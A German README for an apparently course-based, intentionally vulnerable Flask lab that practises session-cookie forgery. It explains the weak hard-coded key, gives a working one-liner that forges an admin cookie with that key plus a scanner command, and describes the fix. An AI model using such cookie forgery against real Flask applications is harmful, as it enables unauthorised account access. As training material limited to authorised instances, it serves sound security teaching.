# challenge_session_forgery/ — Übungs-Ziel: Session-Fälschung

Eine eigenständige, **bewusst verwundbare** Mini-Flask-App zum Üben des
Session-Forgery-Angriffs: Cookie fälschen → Login-Pflicht umgehen. Der
`SECRET_KEY` ist der bekannte Lab-Default `cowboy`; `/dashboard` erzwingt zwar
Login, liest die Identität aber ungeprüft aus dem nur **signierten** (nicht
verschlüsselten) Cookie.

> Nur gegen die eigene/autorisierte Instanz. Standard-Bind ist `127.0.0.1`
> (nur lokal); für die Nachbar-Challenge im Kurs-Netz `HOST=0.0.0.0` setzen.

## Dateien
- `app.py` — die verwundbare Zielseite (`python app.py` → `http://127.0.0.1:5001`)
- `challenge.md` — die Aufgabenstellung („Nachbar:in greift deine Instanz an")

## Schnellstart
```powershell
pip install -r requirements.txt
python app.py                                  # http://127.0.0.1:5001

# Ziel: Dashboard als admin erreichen, ohne admin-Passwort.
# Gültigen Cookie mit user=admin bauen:
python -c "import flask; from flask.sessions import SecureCookieSessionInterface as S; a=flask.Flask(__name__); a.secret_key='cowboy'; print(S().get_signing_serializer(a).dumps({'user':'admin'}))"
# -> als Cookie session=<wert> setzen, /dashboard aufrufen

# oder vom Scanner erkennen + bestätigen lassen:
python ..\attacking\attack_all.py --base http://127.0.0.1:5001 --forge-user admin
```

**Fix** (sichere Variante): langer Zufalls-`SECRET_KEY` nur aus der Umgebung,
nie im Code/Repo. Vgl. Lab-Ordner `../13_session_forgery/`.
